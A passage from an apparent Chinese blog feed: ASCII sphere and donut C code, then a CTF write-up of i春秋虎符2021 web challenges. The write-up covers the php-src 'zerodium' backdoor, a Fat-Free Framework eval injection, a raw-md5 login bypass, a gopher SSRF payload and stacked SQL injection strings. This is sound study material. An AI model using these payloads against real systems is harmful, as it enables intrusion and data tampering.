class="number">45</span>;</span><br><span class="line"><span class="keyword">double</span> g=<span class="number">0.01</span>;</span><br><span class="line"><span class="keyword">double</span> move=(size<span class="number">-1</span>)/<span class="number">2</span>;</span><br><span class="line"><span class="keyword">double</span> r=(<span class="keyword">double</span>(size)<span class="number">-4</span>)/<span class="number">2.0</span>;</span><br><span class="line"><span class="keyword">double</span> light[<span class="number">3</span>]=&#123;<span class="number">-1.3</span>,<span class="number">1</span>,<span class="number">1</span>&#125;;</span><br><span class="line"><span class="keyword">double</span> length=<span class="built_in">sqrt</span>(light[<span class="number">0</span>]*light[<span class="number">0</span>]+light[<span class="number">1</span>]*light[<span class="number">1</span>]+light[<span class="number">2</span>]*light[<span class="number">2</span>]);</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;<span class="number">3</span>;i++)&#123;</span><br><span class="line">light[i]=light[i]/length;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">char</span> shade[]=<span class="string">&quot;.;!o*m0&amp;%@&quot;</span>;</span><br><span class="line"><span class="keyword">int</span> out_i[size][size]=&#123;&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> rotate=<span class="number">0.0</span>;;rotate+=<span class="number">0.05</span>)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line">out_i[i][j]=<span class="number">-1</span>;</span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">double</span> ro[<span class="number">3</span>][<span class="number">3</span>]=&#123;&#123;<span class="number">1.0</span>,<span class="number">0</span>,<span class="number">0</span>&#125;,&#123;<span class="number">0</span>,<span class="built_in">cos</span>(rotate),-<span class="built_in">sin</span>(rotate)&#125;,&#123;<span class="number">0</span>,<span class="built_in">sin</span>(rotate),<span class="built_in">cos</span>(rotate)&#125;&#125;;</span><br><span class="line"><span class="keyword">double</span> light_r[<span class="number">3</span>]=&#123;light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">0</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">0</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">0</span>],</span><br><span class="line"> light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">1</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">1</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">1</span>],</span><br><span class="line"> light[<span class="number">0</span>]*ro[<span class="number">0</span>][<span class="number">2</span>]+light[<span class="number">1</span>]*ro[<span class="number">1</span>][<span class="number">2</span>]+light[<span class="number">2</span>]*ro[<span class="number">2</span>][<span class="number">2</span>]&#125;;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> a=<span class="number">0.0</span>;a&lt;<span class="number">3.15</span>;a+=g)&#123;<span class="comment">//alpha </span></span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">double</span> b=<span class="number">0.0</span>;b&lt;<span class="number">3.15</span>;b+=g)&#123;<span class="comment">//beta </span></span><br><span class="line"><span class="keyword">double</span> x=r*<span class="built_in">sin</span>(b)*<span class="built_in">cos</span>(a);</span><br><span class="line"><span class="keyword">double</span> y=r*<span class="built_in">sin</span>(b)*<span class="built_in">sin</span>(a);</span><br><span class="line"><span class="keyword">double</span> z=r*<span class="built_in">cos</span>(b);</span><br><span class="line"><span class="keyword">double</span> result=(x/r*light_r[<span class="number">0</span>]+y/r*light_r[<span class="number">1</span>]+z/r*light_r[<span class="number">2</span>]+<span class="number">1.0</span>)*<span class="number">0.5</span>;</span><br><span class="line"><span class="keyword">int</span> <span class="keyword">final</span>=<span class="keyword">int</span>(result*<span class="number">10.0</span><span class="number">-1</span>);</span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">if(final&gt;10||final&lt;0)&#123;</span></span><br><span class="line"><span class="comment">if(final&gt;10)final=10;</span></span><br><span class="line"><span class="comment">else if(final&lt;0)final=0;</span></span><br><span class="line"><span class="comment">&#125;</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"><span class="keyword">int</span> cx=<span class="keyword">int</span>(x+move);</span><br><span class="line"><span class="keyword">int</span> cy=<span class="keyword">int</span>(z+move);</span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">final</span>&gt;out_i[cx][cy])<span class="comment">//这种取最大亮度的写法明显是不好的，但这个例子特殊，用起来没问题</span></span><br><span class="line">out_i[cx][cy]=<span class="keyword">final</span>;</span><br><span class="line">&#125; </span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> i=<span class="number">0</span>;i&lt;size;i++)&#123;</span><br><span class="line"><span class="keyword">for</span>(<span class="keyword">int</span> j=<span class="number">0</span>;j&lt;size;j++)&#123;</span><br><span class="line"><span class="keyword">if</span>(out_i[i][j]!=<span class="number">-1</span>)</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;%c%c&quot;</span>,shade[out_i[i][j]],shade[out_i[i][j]]);</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;  &quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="built_in">printf</span>(<span class="string">&quot;\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line">goto_xy(); </span><br><span class="line">&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>附上甜甜圈的代码，写方块之前没仔细看过，所以我写的方块非常冗余（主要是想先独立尝试</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    <span class="keyword">float</span> A = <span class="number">0</span>, B = <span class="number">0</span>;</span><br><span class="line">    <span class="keyword">float</span> i, j;</span><br><span class="line">    <span class="keyword">int</span> k;</span><br><span class="line">    <span class="keyword">float</span> z[<span class="number">1760</span>];</span><br><span class="line">    <span class="keyword">char</span> b[<span class="number">1760</span>];</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">&quot;\x1b[2J&quot;</span>);</span><br><span class="line">    <span class="keyword">for</span>(;;) &#123;</span><br><span class="line">        <span class="built_in">memset</span>(b,<span class="number">32</span>,<span class="number">1760</span>);</span><br><span class="line">        <span class="built_in">memset</span>(z,<span class="number">0</span>,<span class="number">7040</span>);</span><br><span class="line">        <span class="keyword">for</span>(j=<span class="number">0</span>; j &lt; <span class="number">6.28</span>; j += <span class="number">0.07</span>) &#123;</span><br><span class="line">            <span class="keyword">for</span>(i=<span class="number">0</span>; i &lt; <span class="number">6.28</span>; i += <span class="number">0.02</span>) &#123;</span><br><span class="line">                <span class="keyword">float</span> c = <span class="built_in">sin</span>(i);</span><br><span class="line">                <span class="keyword">float</span> d = <span class="built_in">cos</span>(j);</span><br><span class="line">                <span class="keyword">float</span> e = <span class="built_in">sin</span>(A);</span><br><span class="line">                <span class="keyword">float</span> f = <span class="built_in">sin</span>(j);</span><br><span class="line">                <span class="keyword">float</span> g = <span class="built_in">cos</span>(A);</span><br><span class="line">                <span class="keyword">float</span> h = d + <span class="number">2</span>;</span><br><span class="line">                <span class="keyword">float</span> D = <span class="number">1</span> / (c * h * e + f * g + <span class="number">5</span>);</span><br><span class="line">                <span class="keyword">float</span> l = <span class="built_in">cos</span>(i);</span><br><span class="line">                <span class="keyword">float</span> m = <span class="built_in">cos</span>(B);</span><br><span class="line">                <span class="keyword">float</span> n = <span class="built_in">sin</span>(B);</span><br><span class="line">                <span class="keyword">float</span> t = c * h * g - f * e;</span><br><span class="line">                <span class="keyword">int</span> x = <span class="number">40</span> + <span class="number">30</span> * D * (l * h * m - t * n);</span><br><span class="line">                <span class="keyword">int</span> y= <span class="number">12</span> + <span class="number">15</span> * D * (l * h * n + t * m);</span><br><span class="line">                <span class="keyword">int</span> o = x + <span class="number">80</span> * y;</span><br><span class="line">                <span class="keyword">int</span> N = <span class="number">8</span> * ((f * e - c * d * g) * m - c * d * e - f * g - l * d * n);</span><br><span class="line">                <span class="keyword">if</span>(<span class="number">22</span> &gt; y &amp;&amp; y &gt; <span class="number">0</span> &amp;&amp; x &gt; <span class="number">0</span> &amp;&amp; <span class="number">80</span> &gt; x &amp;&amp; D &gt; z[o]) &#123;</span><br><span class="line">                    z[o] = D;</span><br><span class="line">                    b[o] = <span class="string">&quot;.,-~:;=!*#$@&quot;</span>[N &gt; <span class="number">0</span> ? N : <span class="number">0</span>];</span><br><span class="line">                &#125;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\x1b[H&quot;</span>);</span><br><span class="line">        <span class="keyword">for</span>(k = <span class="number">0</span>; k &lt; <span class="number">1761</span>; k++) &#123;</span><br><span class="line">            <span class="built_in">putchar</span>(k % <span class="number">80</span> ? b[k] : <span class="number">10</span>);</span><br><span class="line">            A += <span class="number">0.00004</span>;</span><br><span class="line">            B += <span class="number">0.00002</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        usleep(<span class="number">30000</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> 摸鱼 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>i春秋虎符2021 web</title>
      <link href="2021/04/10/i%E6%98%A5%E7%A7%8B%E8%99%8E%E7%AC%A62021/"/>
      <url>2021/04/10/i%E6%98%A5%E7%A7%8B%E8%99%8E%E7%AC%A62021/</url>
      
        <content type="html"><![CDATA[<p>记录题目扫盲，只有前三题，包含以下points：</p><p>​    ①3.28 php.net后门</p><p>​    ②3F(FatFreeFramework)框架</p><p>​    ③SQL中md5()产生hex的’or’进行的注入</p><p>​    ④SSRF与gopher协议</p><span id="more"></span><!--toc--><h1 id="i春秋虎符2021-web"><a href="#i春秋虎符2021-web" class="headerlink" title="i春秋虎符2021_web"></a>i春秋虎符2021_web</h1><h2 id="签到"><a href="#签到" class="headerlink" title="签到"></a>签到</h2><p>2021.3.28出了php官方git仓库git.php.net被插入恶意代码的事，若使用此源码进行开发，网站就会执行user_agentt头中以zerodium开始的任意代码，注意double t，没有打错</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E7%AD%BE%E5%88%B0github.png"></p><center><a href="https://github.com/php/php-src/commit/c730aa26bd52829a49f2ad284b181b7e82a68d7d">view on github</a></center><p>题目环境是一个blog，最后一篇文章描述了博客搭建过程，在没有hint的情况下这是入手点</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E7%AD%BE%E5%88%B0blog.png"></p><h2 id="unsetme"><a href="#unsetme" class="headerlink" title="unsetme"></a>unsetme</h2><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Kickstart the framework</span></span><br><span class="line"><span class="variable">$f3</span> = <span class="keyword">require</span>(<span class="string">&#x27;1ib/base.php&#x27;</span>);</span><br><span class="line"><span class="variable">$f3</span>-&gt;set( <span class="string">&#x27;DEBUG&#x27;</span> ,<span class="number">1</span>);</span><br><span class="line"><span class="keyword">if</span> ((<span class="keyword">float</span>)PCREVERSION &lt;<span class="number">8.0</span>)</span><br><span class="line">    trigger_error(<span class="string">&#x27;PCREversion is out date&#x27;</span>);</span><br><span class="line"><span class="comment">//Load configuration</span></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="variable">$a</span> = <span class="variable">$GET</span> [<span class="string">&#x27;a&#x27;</span>];</span><br><span class="line"><span class="keyword">unset</span>(<span class="variable">$f3</span>-&gt;<span class="variable">$a</span>);</span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p align='right'><small>关键字：framework，f3</small></p><p>此为基于f3框架编写的代码，拿到手时应先本地搭建此框架，对于本题，这样你才有了base.php，才可以解题，各种不熟悉导致找不到本题入手点</p><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-f3Framework.png"></p><p>把题目代码copy过来，加上route指定路径后本地运行（也就是说要先设置<code>route</code>再<code>run</code>，不然框架跑都跑不起来，怎么设置查一下文档就知道了¯\_(ツ)_/¯）</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$f3</span>-&gt;route(<span class="string">&#x27;GET /test.php&#x27;</span>,</span><br><span class="line">    <span class="function"><span class="keyword">function</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="string">&#x27;route set successfully&#x27;</span>;</span><br><span class="line">    &#125;</span><br><span class="line">);</span><br><span class="line"><span class="variable">$f3</span>-&gt;run();</span><br></pre></td></tr></table></figure><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-f3run.png"></p><p>直接报错了，看看530行eval的情况</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">clear</span>(<span class="params"><span class="variable">$key</span></span>) </span>&#123;</span><br><span class="line">    <span class="comment">#...</span></span><br><span class="line">    <span class="keyword">else</span> &#123;</span><br><span class="line">        <span class="variable">$val</span>=preg_replace(<span class="string">&#x27;/^(\$hive)/&#x27;</span>,<span class="string">&#x27;$this-&gt;hive&#x27;</span>,</span><br><span class="line">                          <span class="keyword">$this</span>-&gt;compile(<span class="string">&#x27;@hive.&#x27;</span>.<span class="variable">$key</span>, <span class="literal">FALSE</span>));</span><br><span class="line">        <span class="keyword">eval</span>(<span class="string">&#x27;unset(&#x27;</span>.<span class="variable">$val</span>.<span class="string">&#x27;);&#x27;</span>);    <span class="comment">#第530行</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="variable">$parts</span>[<span class="number">0</span>]==<span class="string">&#x27;SESSION&#x27;</span>) &#123;</span><br><span class="line">            session_commit();</span><br><span class="line">            session_start();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>追一下代码验证一下是不是<code>unset</code>触发的<code>clear()</code>，发现调用链条是<code>__unset($key)</code>→<code>offsetunset($key)</code>→<code>clear($key)</code>实锤</p><p>见里面有一个<code>compile()</code>，康康</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">compile</span>(<span class="params"><span class="variable">$str</span>, <span class="variable">$evaluate</span>=<span class="literal">TRUE</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> (!<span class="variable">$evaluate</span>)</span><br><span class="line">        ? preg_replace_callback(</span><br><span class="line">            <span class="string">&#x27;/^@(\w+)((?:\..+|\[(?:(?:[^\[\]]*|(?R))*)\])*)/&#x27;</span>,</span><br><span class="line">            <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$expr</span></span>) </span>&#123;</span><br><span class="line">                <span class="variable">$str</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$expr</span>[<span class="number">1</span>];</span><br><span class="line">                <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$expr</span>[<span class="number">2</span>]))</span><br><span class="line">                    <span class="variable">$str</span>.=preg_replace_callback(</span><br><span class="line">                        <span class="string">&#x27;/\.([^.\[\]]+)|\[((?:[^\[\]\&#x27;&quot;]*|(?R))*)\]/&#x27;</span>,</span><br><span class="line">                        <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$sub</span></span>) </span>&#123;</span><br><span class="line">                            <span class="variable">$val</span>=<span class="keyword">isset</span>(<span class="variable">$sub</span>[<span class="number">2</span>]) ? <span class="variable">$sub</span>[<span class="number">2</span>] : <span class="variable">$sub</span>[<span class="number">1</span>];</span><br><span class="line">                            <span class="keyword">if</span> (ctype_digit(<span class="variable">$val</span>))</span><br><span class="line">                                <span class="variable">$val</span>=(<span class="keyword">int</span>)<span class="variable">$val</span>;</span><br><span class="line">                            <span class="variable">$out</span>=<span class="string">&#x27;[&#x27;</span>.<span class="keyword">$this</span>-&gt;export(<span class="variable">$val</span>).<span class="string">&#x27;]&#x27;</span>;</span><br><span class="line">                            <span class="keyword">return</span> <span class="variable">$out</span>;</span><br><span class="line">                        &#125;,</span><br><span class="line">                        <span class="variable">$expr</span>[<span class="number">2</span>]</span><br><span class="line">                    );</span><br><span class="line">                <span class="keyword">return</span> <span class="variable">$str</span>;</span><br><span class="line">            &#125;,</span><br><span class="line">            <span class="variable">$str</span></span><br><span class="line">        )</span><br><span class="line"><span class="comment">#------------------下面这段都无关，毕竟clear()里传了FALSE------------------</span></span><br><span class="line">        : preg_replace_callback(</span><br><span class="line">        <span class="string">&#x27;/(?&lt;!\w)@(\w+(?:(?:\-&gt;|::)\w+)?)&#x27;</span>.</span><br><span class="line">        <span class="string">&#x27;((?:\.\w+|\[(?:(?:[^\[\]]*|(?R))*)\]|(?:\-&gt;|::)\w+|\()*)/&#x27;</span>,</span><br><span class="line">        <span class="function"><span class="keyword">function</span>(<span class="params"><span class="variable">$expr</span></span>) </span>&#123;</span><br><span class="line">            <span class="variable">$str</span>=<span class="string">&#x27;$&#x27;</span>.<span class="variable">$expr</span>[<span class="number">1</span>];</span><br><span class="line">        <span class="comment">#...</span></span><br></pre></td></tr></table></figure><p>看样子对输入做了改动，但其实不想分析<code>complie()</code>的话，直接<code>echo</code>即可知道到底eval了什么代码</p><blockquote>当a=hello<br>[Out] unset('$this->hive['hello']');</blockquote><p>但现在既然比赛已经结束那还是稍微深入看一下<code>complie()</code>，遇到了我没见过的php：回调，匿名函数</p><ul><li><p>回调：在函数执行的过程中，一般是不能去干预他的行为的，当函数被设计成带有回调功能时，我们就有可能在函数的执行过程中，通过回调函数去干预他</p>  <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">foo</span>(<span class="params"><span class="variable">$n</span>, <span class="variable">$f</span>=<span class="string">&#x27;&#x27;</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">if</span>(<span class="variable">$n</span> &lt; <span class="number">1</span>) <span class="keyword">return</span>;</span><br><span class="line">  <span class="keyword">for</span>(<span class="variable">$i</span>=<span class="number">0</span>; <span class="variable">$i</span>&lt;<span class="variable">$n</span>; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$f</span> ? <span class="variable">$f</span>(<span class="variable">$i</span>) : <span class="variable">$i</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">//无回调时</span></span><br><span class="line">foo(<span class="number">5</span>); <span class="comment">//01234</span></span><br><span class="line"> </span><br><span class="line"><span class="comment">//有回调时</span></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">f1</span>(<span class="params"><span class="variable">$v</span></span>) </span>&#123;</span><br><span class="line">  <span class="keyword">return</span> <span class="variable">$v</span> + <span class="variable">$v</span>;</span><br><span class="line">&#125;</span><br><span class="line">foo(<span class="number">5</span>, <span class="string">&#x27;f1&#x27;</span>); <span class="comment">//02468</span></span><br></pre></td></tr></table></figure></li><li><p>匿名函数：允许临时创建一个没有指定名称的函数。最经常用作回调函数<code>callable</code>回调参数的值</p></li></ul><p>而<code>preg_replace_callback</code>除了可以指定一个 <code>callback</code> 替代 <code>replacement</code> 进行替换字符串的计算，其他方面等同于<code>preg_replace</code></p><p>至于什么<code>$this-&gt;hive</code>之类的杂七杂八的都是后面才加上去的，和<code>compile()</code>无关</p><p>因为传参<code>a</code>会被<code>compile</code>处理为<code>[&#39;xxx&#39;]</code>的形式，所以需要打破这种格式，然后点号连接并闭合<code>unset</code>，最后<code>eval</code>执行任意代码</p><p>看看这个正则<code>&#39;/\.([^.\[\]]+)|\[((?:[^\[\]\&#39;&quot;]*|(?R))*)\]/&#39;</code>，并没有匹配换行符，所以出了换行符这个正则就会被打断，于是便超度成功</p><p><img src="/images/%E8%99%8E%E7%AC%A6-unsetme-%E6%8D%A2%E8%A1%8C%E7%AC%A6.png"></p><h2 id="慢慢做管理系统"><a href="#慢慢做管理系统" class="headerlink" title="慢慢做管理系统"></a>慢慢做管理系统</h2><blockquote>描述：这个sql吧，有点ssrf的样子，首页是一个很普通的sql注入，没有什么花样，但是我的admin.php是一个内网的管理系统，只要你用“真-admin”的密码登录了，就可以拿到flag</blockquote><blockquote>hint：第一步登录的sql语句是"SELECT * FROM users WHERE password = '".md5($password,true)."' limit 0,1";</blockquote><p>这个题没有怎么动，目前也没找到复现，暂时只能面向wp扫盲</p><h3 id="登录"><a href="#登录" class="headerlink" title="登录"></a>登录</h3><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-%E7%99%BB%E5%BD%95.png"></p><p>关键字是<code>md5($password,true)</code>，第二个参数<code>raw=true</code>即转md5后又做一次<code>hex2str</code></p><table><thead><tr><th align="left">参数</th><th align="left">描述</th></tr></thead><tbody><tr><td align="left"><em>string</em></td><td align="left">必需。规定要计算的字符串。</td></tr><tr><td align="left"><em>raw</em></td><td align="left">可选。规定十六进制或二进制输出格式：TRUE - 原始 16 字符二进制格式FALSE - 默认。32 字符十六进制数</td></tr></tbody></table><p>所以hint描述的这一步其实是md5万能密码：<code>ffifdyop</code>与<code>129581926211651571912466741651878684928</code>在经过md5并转字符后均包含有<code>&#39;or&#39;</code>，只要<code>&#39;or&#39;</code>右边非零，即会判定整个表达式为true，以此便绕过了登录</p><h3 id="gopher协议"><a href="#gopher协议" class="headerlink" title="gopher协议"></a>gopher协议</h3><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-gopher.png"></p><blockquote>gopher协议支持发出GET、POST请求：可以先截获get请求包和post请求包，在构成符合gopher协议的请求。gopher协议是ssrf利用中最强大的协议</blockquote><p>SSRF：Server-side Request Forge，服务端请求伪造；说白了就是：<i>因为是由服务端发起，从而能够请求到与它相连而与外网隔离的内部系统</i> 的一种攻击方式，比如通过file://，gopher://之类的协议来读本地文件什么的</p><p>本题是屏蔽了<code>file://</code>的，只能用<code>gopher://</code></p><p>Gopher协议格式：<code>URL:gopher://&lt;host&gt;:&lt;port&gt;/&lt;gopher-path&gt;_TCP数据流</code></p><ul><li>gopher的默认端口是70</li><li>如果发起POST请求，请求体需要进行url编码，回车换行需要使用<code>%0d</code>或<code>%0a</code>代替</li></ul><p>payload：/ssrf.php?way=127.0.0.1/admin.php，发现admin.php不再302了</p><p><img src="/images/%E8%99%8E%E7%AC%A6-%E6%85%A2%E6%85%A2%E5%81%9A-admin.png"></p><p>然后通过gopher协议给admin.php发POST数据，HTTP协议默认端口是80，所以是往<code>127.0.0.1:80</code>发包：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">gopher:&#x2F;&#x2F;127.0.0.1:80&#x2F;_POST%20%2Fadmin.php%20HTTP%2F1.1%0aHost%3A%20127.0.0.1%0aContent-Type%3A%20application%2Fx-www-form-urlencoded%0aContent-Length%3A%2027%0ausername%3Dtest%26password%3Dtest%0a</span><br></pre></td></tr></table></figure><blockquote>gopher://127.0.0.1:80/<br>_POST /admin.php HTTP/1.1<br>Host: 127.0.0.1<br>Content-Type: application/x-www-form-urlencoded<br>Content-Length: 27<br>username=test&password=test</blockquote><h3 id="改表名"><a href="#改表名" class="headerlink" title="改表名"></a>改表名</h3><p>通过改表名获取数据@2019强网杯，也可以通过<code>prepare</code>预处理<code>concat</code>过滤的<code>select</code>，预处理的方法之前就记录过，不再重复</p><p>当过滤了<code>select</code>，就不能在查出表名列名后选中数据，但若查询的回显就是表中的字段，则可以通过<code>rename</code>将默认查询的表替换为目标表，从而直接从回显获取字段</p><p>例如本题中<code>fake_admin</code>是默认被查询的表，<code>real_admin_here_do_you_find</code>是目标表</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$payload &#x3D; &quot;username&#x3D;admin&#39;&#x2F;**&#x2F;or&#x2F;**&#x2F;1&#x3D;2;RENAME TABLE &#96;fake_admin&#96; TO &#96;fake_admin1&#96;;RENAME TABLE &#96;real_admin_here_do_you_find&#96; TO &#96;fake_admin&#96;;##&amp;password&#x3D;129581926211651571912466741651878684928&quot;;</span><br></pre></td></tr></table></figure><p>顺便记一下 [2019强网杯-随便注] 的payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#x2F;?inject&#x3D;1&#39;;RENAME TABLE &#96;words&#96; TO &#96;words1&#96;;RENAME TABLE &#96;1919810931114514&#96; TO &#96;words&#96;;ALTER TABLE &#96;words&#96; CHANGE &#96;flag&#96; &#96;id&#96; VARCHAR(100) CHARACTER SET utf8 COLLATE utf8_general_ci NOT NULL;show columns from words;#</span><br></pre></td></tr></table></figure><p>此处改列名<code>flag</code>为<code>id</code>是因为目标表中没有<code>id</code>列，而查询是根据id查询，避免了一开始无法查询的情况</p><p><code>CHANGE</code>的语法为：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ALTER TABLE t1 CHANGE c_old c_new INTEGER ;#把名为c_old的列名改为c_new，类型为整数型</span><br></pre></td></tr></table></figure><h2 id="Internal-System"><a href="#Internal-System" class="headerlink" title="Internal System"></a>Internal System</h2><p>超出能力范围的部分有点多，积累起来了再说</p><link rel="stylesheet" href="/css/spoiler.css" type="text/css"><script src="/js/spoiler.js" type="text/javascript" async></script>]]></content>
      
      
      <categories>
          
          <category> Web </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP奇怪的目录访问机制</title>
      <link href="2021/03/28/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/"/>
      <url>2021/03/28/PHP%E5%A5%87%E6%80%AA%E7%9A%84%E7%9B%AE%E5%BD%95%E8%AE%BF%E9%97%AE%E6%9C%BA%E5%88%B6/</url>
      
